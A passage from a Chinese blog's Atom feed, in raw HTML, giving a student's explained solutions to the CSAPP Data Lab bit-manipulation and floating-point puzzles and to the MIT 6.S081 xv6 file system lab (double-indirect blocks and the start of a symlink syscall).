keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：</p><p>当 x = 0 时，<code>-x = x</code> ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。</p><p>可以利用这一特性将 <code>x | nx</code> 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 0，且刚好与零和非零对应。</p><h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：</p><p>对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。</p><p>对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。</p><h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>    <span class="token comment">// 二分搜索</span>    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>    b1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>这题主要是要对规格化数和非规格化数进行分类讨论：</p><p>当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。</p><p>当 uf 为非规格化数，即阶码为 0 时，此时 uf 的值完全由尾数来表示，且不含隐含 0，因此乘二相当于将尾数乘二，即左移 1 位。</p><p>需要注意的是，当 uf 为非规格化数且尾数最高位为 1 时，尾数左移会导致最高位的 1 移动到阶码的最低位。但经过验证，此时的结果仍然符合预期，即非规格化数无缝衔接到了规格化数，不禁感叹 IEEE 754 标准浮点数的设计之精妙。</p><h2 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token keyword">return</span> uf<span class="token punctuation">;</span>        <span class="token comment">// 无穷大或者 NaN</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        m <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0xff800000</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> m<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        t <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        uf <span class="token operator">&amp;=</span> <span class="token number">0x807fffff</span><span class="token punctuation">;</span>        uf <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> uf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><h2 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h2><p>首先确定整数所能表示的上下界的值：当阶码小于 127，即指数位小于 0 时，此时浮点数 uf 小于 1，对应的整数为 0；当阶码大于 150，即指数位大于 23 时，此时单精度浮点数的精度（尾数长度）不足以正确表示对应的整数，返回 0x80000000。</p><p>对于在合理范围内的 uf，将其转换为对应的整数，首先需要尾数最高位的高一位加上规格化数隐含的 1，再根据阶码的大小将尾数进行右移，阶码越大，右移位数越少。最后根据符号位的值选择是否将结果取反加一。</p><h2 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">floatFloat2Int</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> s <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// 符号</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// 阶码</span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// 尾数</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 小于 1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 大于 1 且不溢出</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;=</span> <span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> m <span class="token operator">|</span> <span class="token number">0x800000</span><span class="token punctuation">;</span>        val <span class="token operator">>>=</span> <span class="token punctuation">(</span><span class="token number">23</span> <span class="token operator">-</span> <span class="token punctuation">(</span>t <span class="token operator">-</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            val <span class="token operator">=</span> <span class="token operator">~</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 溢出</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x80000000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><h2 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h2><p>同样是对规格化数和非规格化数的分类讨论：</p><p>当 <code>x &gt;= -150 &amp;&amp; x &lt; -127</code> 时，结果为非规格化数，此时浮点数表示只有一个位为 1，其余全为 0。直接根据指数 x 的值确定该位的位置即可。</p><p>当 <code>x &gt;= -127 &amp;&amp; x &lt; 128</code> 时，结果为规格化数，此时浮点数表示的尾数全为 0，只有阶码用来表示指数的值。根据指数 x 的值确定阶码的值，然后构造出浮点数即可。</p><h2 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatPower2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> val<span class="token punctuation">;</span>    <span class="token comment">// 太小</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 非规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">150</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 规格化数</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">unsigned</span> t <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">127</span><span class="token punctuation">;</span>        val <span class="token operator">|=</span> <span class="token punctuation">(</span>t <span class="token operator">&lt;&lt;</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 太大</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        val <span class="token operator">=</span> <span class="token number">0x7f800000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> val<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="位运算" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab File system</title>
    <link href="http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/"/>
    <id>http://lordaeronesz.github.io/2024/08/16/MIT6.s081-2021-Lab%20File%20system/</id>
    <published>2024-08-16T03:45:11.000Z</published>
    <updated>2024-08-16T10:21:40.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>xv6 文件系统的 inode 中地址域 <code>addrs[]</code> 由 12 个直接地址和 1 个一级间接地址组成，本实验要求将地址域更改为 11 个直接地址、1 个一级间接地址和 1 个二级间接地址组成，以支持更大文件的存储。</p><p>代码的实现有了直接地址和一级间接地址做参考，就很简单了，直接查看代码部分即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/file.h b/kernel/file.hindex b076d1d..5c4eb3a 100644<span class="token coord">--- a/kernel/file.h</span><span class="token coord">+++ b/kernel/file.h</span>@@ -26,7 +26,7 @@ struct inode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// map major device number to device functions.</span></span>diff --git a/kernel/fs.c b/kernel/fs.cindex 40c9bd4..4c00ab5 100644<span class="token coord">--- a/kernel/fs.c</span><span class="token coord">+++ b/kernel/fs.c</span>@@ -400,6 +400,33 @@ bmap(struct inode *ip, uint bn)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    brelse(bp);</span><span class="token prefix unchanged"> </span><span class="token line">    return addr;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  bn -= NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if (bn &lt; NINDIRECT2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = ip->addrs[NDIRECT + 1]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      ip->addrs[NDIRECT + 1] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    uint i = bn / NINDIRECT, j = bn % NINDIRECT;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[i]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[i] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, addr);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    if ((addr = a[j]) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      a[j] = addr = balloc(ip->dev);</span><span class="token prefix inserted">+</span><span class="token line">      log_write(bp);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    return addr;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  panic("bmap: out of range");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -432,6 +459,29 @@ itrunc(struct inode *ip)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    ip->addrs[NDIRECT] = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  struct buf *bp2;</span><span class="token prefix inserted">+</span><span class="token line">  uint *a2;</span><span class="token prefix inserted">+</span><span class="token line">  if (ip->addrs[NDIRECT + 1]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    bp = bread(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    a = (uint *)bp->data;</span><span class="token prefix inserted">+</span><span class="token line">    for (i = 0; i &lt; NINDIRECT; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (a[i]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        bp2 = bread(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">        a2 = (uint *)bp2->data;</span><span class="token prefix inserted">+</span><span class="token line">        for (j = 0; j &lt; NINDIRECT; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">          if (a2[j]) &#123;</span><span class="token prefix inserted">+</span><span class="token line">            bfree(ip->dev, a2[j]);</span><span class="token prefix inserted">+</span><span class="token line">          &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        brelse(bp2);</span><span class="token prefix inserted">+</span><span class="token line">        bfree(ip->dev, a[i]);</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    brelse(bp);</span><span class="token prefix inserted">+</span><span class="token line">    bfree(ip->dev, ip->addrs[NDIRECT + 1]);</span><span class="token prefix inserted">+</span><span class="token line">    ip->addrs[NDIRECT + 1] = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  ip->size = 0;</span><span class="token prefix unchanged"> </span><span class="token line">  iupdate(ip);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/kernel/fs.h b/kernel/fs.hindex 139dcc9..cd5de8a 100644<span class="token coord">--- a/kernel/fs.h</span><span class="token coord">+++ b/kernel/fs.h</span>@@ -24,9 +24,10 @@ struct superblock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define FSMAGIC 0x10203040</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define NDIRECT 12</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NDIRECT 11</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define NINDIRECT (BSIZE / sizeof(uint))</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define NINDIRECT2 (NINDIRECT * NINDIRECT)</span><span class="token prefix inserted">+</span><span class="token line">#define MAXFILE (NDIRECT + NINDIRECT + NINDIRECT2)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// On-disk inode structure</span><span class="token prefix unchanged"> </span><span class="token line">struct dinode &#123;</span></span>@@ -35,7 +36,7 @@ struct dinode &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  short minor;          // Minor device number (T_DEVICE only)</span><span class="token prefix unchanged"> </span><span class="token line">  short nlink;          // Number of links to inode in file system</span><span class="token prefix unchanged"> </span><span class="token line">  uint size;            // Size of file (bytes)</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  uint addrs[NDIRECT+1];   // Data block addresses</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uint addrs[NDIRECT+2];   // Data block addresses</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Inodes per block.</span></span></code></pre><h1 id="Symbolic-links"><a href="#Symbolic-links" class="headerlink" title="Symbolic links"></a>Symbolic links</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本实验要求为 xv6 实现符号链接（软链接）机制，符号链接本质上也是一个文件，只不过它的数据内容为该链接指向的文件路径，这其实与 Windows 系统的快捷方式十分类似。实现方案如下：</p><p>首先依照 Lab System call 中的方法，添加系统调用 <code>symlink</code>：添加 <code>symlink()</code> 声明，添加系统调用号，添加系统调用 entry，添加 <code>sys_symlink()</code> 声明。</p><p>在理解了符号链接的本质后，就可以着手实现 <code>sys_symlink</code> 了。首先明确一下 <code>symlink</code> 的作用，它包含两个参数：target 和 path，作用是创建一个目录为 path 的符号链接，该符号链接指向目录为 target 的文件。实现思路应该比较清晰：使用 <code>create()</code> 创建一个文件类型为符号链接（需要自行定义）的文件，再使用 <code>writei()</code> 将字符串 path 写入该文件中。</p><pre class="language-c" data-language="c"><code class="language-c">uint64 <span class="token function">sys_symlink</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n1<span class="token punctuation">,</span> n2<span class="token punctuation">;</span>    <span class="token keyword">char</span> target<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">,</span> path<span class="token punctuation">[</span>MAXPATH<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>ip<span class="token punctuation">;</span>    <span class="token comment">// get arguments of symlink</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n1 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n2 <span class="token operator">=</span> <span class="token function">argstr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">begin_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// create symbol link in the path</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ip <span class="token operator">=</span> <span class="token function">create</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> T_SYMLINK<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// write target to file that ip points to</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writei</span><span class="token punctuation">(</span>ip<span 